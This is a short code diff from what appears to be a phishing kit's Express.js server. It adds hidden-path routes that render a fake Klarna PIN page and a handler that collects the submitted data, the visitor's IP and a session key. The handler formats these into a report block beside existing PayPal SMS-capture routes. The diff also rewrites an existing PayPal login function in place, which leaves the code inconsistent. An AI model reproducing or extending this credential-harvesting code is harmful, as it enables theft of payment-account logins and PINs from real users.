@@ -3562,7 +3562,10 @@ app.get("/SoZ4opAM7PZIBpY0Ua7tV", (req, res) => { // SMS : paypal
 app.get("/CoR4opAT7PZu4op0UF7Po", (req, res) => { // SMS : paypal
   res.render("simopaypo2");
 });
-
+// klarna
+app.get("/PINKlarTbjqMpc34D4XsPJ2", (req, res) => { // SMS : paypal
+  res.render("pin-klar");
+});
 
 
 
@@ -3691,13 +3694,18 @@ app.post("/AD20rPkZd8QatVEZGz5l", (req, res) => { // PayPal sms post
   b3(data, clientIp,keyId);
   res.send({ OK: true });
 });
-
+// klarna
+app.post("/PPiKlarTbjqMpc34D4XsPJ2", (req, res) => { // SMS : paypal
+  let data = req.body;
+  const keyId = req.session.keyId;
+  const clientIp = getAccurateClientIp(req);
+  b4(data, clientIp,keyId);
+  res.send({ OK: true });
+});
 // Functions:
-// 9alab dayal CHULDA:
-
-function b1(data, ip,keyId) {
+function b4(data, ip,keyId) {
   let block = "";
-  block += `${brand}  | [LOGIN] (PayPal) |  TEAM\n`;
+  block += `${brand}  | [PIN] (Klarna) |  TEAM\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `USER: ${data.username}\nIP: ${ip}\n\n`;
   block += `KEY-Sender: ${keyId}\n`;
